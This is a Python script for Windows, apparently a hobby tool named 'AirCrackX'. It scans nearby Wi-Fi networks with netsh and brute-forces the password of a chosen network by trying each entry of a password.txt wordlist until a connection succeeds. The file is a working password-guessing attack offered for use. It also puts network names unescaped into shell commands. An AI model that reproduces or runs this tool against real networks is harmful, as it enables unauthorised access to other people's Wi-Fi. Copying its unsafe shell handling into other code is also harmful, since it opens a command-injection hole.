import os
import re
import time

from pyfiglet import Figlet
from rich.console import Console
from tabulate import tabulate
from colorama import init, Fore

init()

password_list = []


def get_wifi_details():
    """Fetches and displays the currently connected Wi-Fi SSID and other network details."""
    
    # Run netsh command to get interface details
    output = os.popen("netsh wlan show interfaces").read()
    
    # Extract details using regex
    ssid_match = re.search(r"SSID\s*:\s(.+)", output)
    bssid_match = re.search(r"BSSID\s*:\s(.+)", output)
    signal_match = re.search(r"Signal\s*:\s([\d]+)%?", output)
    radio_match = re.search(r"Radio type\s*:\s(.+)", output)
    auth_match = re.search(r"Authentication\s*:\s(.+)", output)
    cipher_match = re.search(r"Cipher\s*:\s(.+)", output)
    
    # Display results
    if ssid_match:
        print(f"                    SSID (Network Name)   : {ssid_match.group(1).strip()}")
        print(f"                    BSSID (Router MAC)    : {bssid_match.group(1).strip() if bssid_match else 'N/A'}")
        print(f"                    Signal Strength       : {signal_match.group(1).strip()}%" if signal_match else "N/A")
        print(f"                    Radio Type            : {radio_match.group(1).strip() if radio_match else 'N/A'}")
        print(f"                    Authentication Type   : {auth_match.group(1).strip() if auth_match else 'N/A'}")
        print(f"                    Cipher Type           : {cipher_match.group(1).strip() if cipher_match else 'N/A'}")
    else:
        print("                      Not connected to any Wi-Fi network.")


def scan_wifi():
    """Scans available Wi-Fi networks and returns them as a list of (SSID, Signal Strength)."""
    output = os.popen("netsh wlan show networks mode=Bssid").read()
    networks = output.split("SSID ")

    wifi_list = []  # Store Wi-Fi details

    for net in networks[1:]:  # Skip the first part before SSID 1
        ssid_match = re.search(r":\s(.+)", net.splitlines()[0])  # Extract SSID
        signal_match = re.findall(r"Signal\s*:\s([\d]+)%?", net)  # Extract all signal strengths
        
        if ssid_match:
            ssid = ssid_match.group(1).strip()
            signal_strength = signal_match[0] if signal_match else "Unknown"
            wifi_list.append((ssid, signal_strength))  # Append SSID and Signal Strength

    return wifi_list

def connect_to_wifi(ssid, password):
    """Connects to the selected Wi-Fi network using the provided SSID and password."""
    profile = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>manual</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPA2PSK</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>
    """

    # Save the Wi-Fi profile as an XML file
    profile_path = f"{ssid}.xml"
    with open(profile_path, "w") as file:
        file.write(profile)

    # Add the Wi-Fi profile
    os.system(f'netsh wlan add profile filename="{profile_path}"')

    # Connect to the Wi-Fi network
    os.system(f'netsh wlan connect name="{ssid}"')

    print(f"\nConnecting to {ssid}... using {password}")
    
    # Wait a few seconds for connection attempt
    time.sleep(5)

    # Check if the connection is successful
    if check_wifi_status(ssid):
        print(f"Successfully connected to '{ssid}'.")

        return True
    else:
        print(f"Not Connected or Wrong Password for '{ssid}'.")

        return False

def check_wifi_status(expected_ssid):
    """Checks if the system is connected to the specified Wi-Fi SSID."""
    output = os.popen("netsh wlan show interfaces").read()
    connected_match = re.search(r"SSID\s*:\s(.+)", output)

    if connected_match:
        current_ssid = connected_match.group(1).strip()
        return current_ssid == expected_ssid  # Check if connected to the desired SSID

    return False



def show_available_wifi_networks(wifi_networks):
    """Display available Wi-Fi networks in a table format."""
    
    if wifi_networks:
        # Convert data into a tabular format
        table_data = [[index + 1, ssid, f"{signal}%"] for index, (ssid, signal) in enumerate(wifi_networks)]
        headers = ["No.", "SSID (Network Name)", "Signal Strength"]

        print("\nAvailable Wi-Fi Networks:")
        print(tabulate(table_data, headers=headers, tablefmt="grid"))  # You can change "grid" to "plain", "pipe", etc.

        # Ask the user to select a network
        try:
            choice = int(input("\nEnter the number of the Wi-Fi network you want to connect to: "))
            print(type(choice))
            if 1 <= choice <= len(wifi_networks):

                password_list = []

                file = open("password.txt","r")

                l1 = file.readlines()
                for i in l1:
                    new_password,emptySpace,extra = i.split(" ")
                    password_list.append(new_password)
                

                for password in password_list:
                    selected_ssid = wifi_networks[choice - 1][0]
                    wifi_password = password
                    is_connected = connect_to_wifi(selected_ssid, wifi_password)

                    if (is_connected):
                        break
            else:
                print("Invalid choice. Please run the script again and select a valid option.")
        except ValueError as e:
            print(f"Invalid input. Please enter a valid number. : {e}")
    else:
        print("No Wi-Fi networks found.")

def help():
    print("\n")
    print(" - help             : Displays this page")
    print(" - scan             : Performs a WI-FI scan")
    print(" - attack           : Attacks selected WI-FI")
    print(" - exit             : Close the program")

    return
# Main Execution
console = Console()

figlet = Figlet(font='big')
text = figlet.renderText("              AirCrackX")

# Print colored text using Rich
console.print(f"[cyan]{text}[/cyan]")
console.print(f"[cyan]{"----------------------------------------------------------------------------------------"}[/cyan]")

get_wifi_details()

console.print(f"[cyan]{"----------------------------------------------------------------------------------------"}[/cyan]")

wifi_networks = scan_wifi()


print("\nType 'help' for more info...")



while(True):
    command = input(Fore.CYAN + "\nAirCrackX $- ")

    if (command == 'help'):
        help()
    elif (command == 'scan'):
        show_available_wifi_networks(wifi_networks)
    elif (command == 'exit'):
        break

